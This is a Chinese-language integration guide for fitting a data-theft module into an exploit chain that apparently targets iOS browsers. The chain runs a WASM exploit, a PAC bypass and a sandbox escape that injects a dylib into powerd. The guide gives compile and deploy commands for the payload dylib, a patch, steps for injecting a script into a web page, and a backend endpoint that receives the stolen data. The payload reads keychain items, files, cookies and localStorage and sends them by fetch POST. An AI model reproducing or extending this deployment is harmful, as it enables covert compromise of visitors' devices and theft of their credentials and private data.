# Coruna + DarkSword 数据收集集成指南

## 概述

通过将 DarkSword 的数据收集功能移植到 Coruna 的架构中，
可以形成完整的数据收集管道：

```
group.html
  ├── Stage1 (WASM exploit) → 获取 WASM 读写原语
  ├── Stage2 (PAC bypass) → 绕过指针认证
  ├── Stage3 (sandbox escape) → 将 dylib 注入 powerd
  │   ├── 创建共享缓冲区 (Uint32Array, 16MB)
  │   ├── 将 data_collector.dylib 加载到 powerd 中
  │   ├── data_collector.dylib 通过 dlopen/dlsym 收集数据
  │   └── 结果通过 D[0]=3/7 状态写回共享缓冲区
  └── data_collector.js (新增)
      ├── 通过 __stage3Buffer 与 dylib 通信
      ├── 在 JS 端收集浏览器可访问数据（回退方案）
      ├── 将收集到的所有数据通过 fetch POST 发送到后端
      └── 周期性轮询（每 60 秒）
```

## 文件清单

| 文件 | 说明 |
|------|-------------|
| `data_collector.dylib.c` | 替换 bootstrap.dylib 的 dylib 源码 |
| `data_collector.js` | JS 端数据收集模块，可加入 group.html |
| `patch_stage3.patch` | 让 Stage3_VariantB.js 暴露共享缓冲区的补丁 |

## 集成步骤

### 第一步：编译 dylib（在 Mac 上操作）

```bash
# 需要 macOS + Xcode（ARM64 交叉编译工具链）
clang -arch arm64 -o data_collector.dylib \
      -shared -Os \
      -Wl,-dylib,-dead_strip \
      -framework Foundation \
      -framework CoreFoundation \
      -framework Security \
      -framework IOKit \
      data_collector.dylib.c

# 将其复制到 payloads 目录
cp data_collector.dylib Coruna-main/payloads/bootstrap.dylib
```

### 第二步：应用 Stage3 补丁

已应用补丁：在 `Stage3_VariantB.js:1419` 添加了：
```javascript
window.__stage3Buffer = A; // 向 data_collector.js 暴露共享缓冲区
```

### 第三步：将 data_collector.js 加入 group.html

在 `group.html` 末尾、脚本标记之前添加：

```html
<script src="data_collector.js"></script>
<!-- 或直接内联内容 -->
```

或者直接在 `group.html` 末尾内联：

```html
<script>
// [将 data_collector.js 的内容粘贴在这里]
</script>
</body>
```

### 第四步：添加后端 `/api/collect` 端点

在您的 FastAPI 后端添加（如果尚不存在）：

```python
# backend/api/collect.py
from fastapi import APIRouter, Depends
from pydantic import BaseModel
import sqlite3

router = APIRouter()

class CollectPayload(BaseModel):
    deviceUUID: str
    timestamp: int
    categories: dict

@router.post("/api/collect")
async def collect_data(payload: CollectPayload):
    conn = get_db()
    conn.execute("""
        INSERT INTO collected_data (device_uuid, timestamp, category, data)
        VALUES (?, ?, ?, ?)
    """, (payload.deviceUUID, payload.timestamp,
          json.dumps(list(payload.categories.keys())),
          json.dumps(payload.categories)))
    conn.commit()
    return {"ok": True}
```

## 数据流程

```
powerd 内部 (dylib)                    WebKit 内部 (JS)                   后端
─────────────────                    ──────────────────                   ──────
dlopen("Security") →                          │                            │
SecItemCopyMatching()                          │                            │
  ├── 成功 → 写入缓冲区                         │                            │
  ├── 失败 → 写入错误                           │                            │
      │                                        │                            │
      │── D[0]=3 (数据就绪) ──────────────────→│                            │
      │                                        ├── 读取缓冲区                 │
      │                                        ├── fetch POST ─────────────→│
      │                                        │                            ├── 存入 SQLite
      │                                        │                            └── {ok:true}
      │                                        │                            │
      │                                   JS 端收集                         │
      │                                   (不需要 dylib)                    │
      │                                     ├── userAgent, screen, etc.      │
      │                                     ├── cookies, localStorage        │
      │                                     └── performance 数据             │
```

## JS 端回退收集（无需 dylib）

即使没有可编译的 dylib，data_collector.js 也始终会收集以下内容：
- 设备信息（User-Agent、屏幕、WebGL、时区）
- Cookie 和 localStorage 数据
- Performance/navigation 数据

这些数据始终通过 `window.DataCollector.runCollection()` 报告。

## dylib 命令参考

通过 D[0]=6 写入缓冲区的命令：

| 命令 | 说明 | 预期 |
|-------|------|--------|
| `cmd:device_info` | 通过 IOKit 获取 UUID | 在 powerd 中有效 |
| `cmd:read_file:/path` | 读取文件（十六进制） | 在 powerd 沙箱中受限 |
| `cmd:keychain` | 调用 SecItemCopyMatching | 在 powerd 沙箱中受限 |
| `cmd:all` | 简单健康检查 | 始终有效 |
| `cmd:exit` | 优雅退出 | 终止 dylib |

## 在 Mac 上编译 dylib

```bash
# 安装 Xcode 命令行工具
xcode-select --install

# 编译
clang -arch arm64 -o data_collector.dylib \
      -shared -Os \
      -Wl,-dylib,-dead_strip \
      -framework Foundation \
      -framework CoreFoundation \
      -framework Security \
      -framework IOKit \
      -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
      data_collector.dylib.c

# 验证
file data_collector.dylib
# 输出: data_collector.dylib: Mach-O 64-bit dynamically linked shared library arm64

# 检查入口点
nm data_collector.dylib | grep _process
# 输出: 000000000000XXXX T _process

# 部署
cp data_collector.dylib ../Coruna-main/payloads/bootstrap.dylib
```
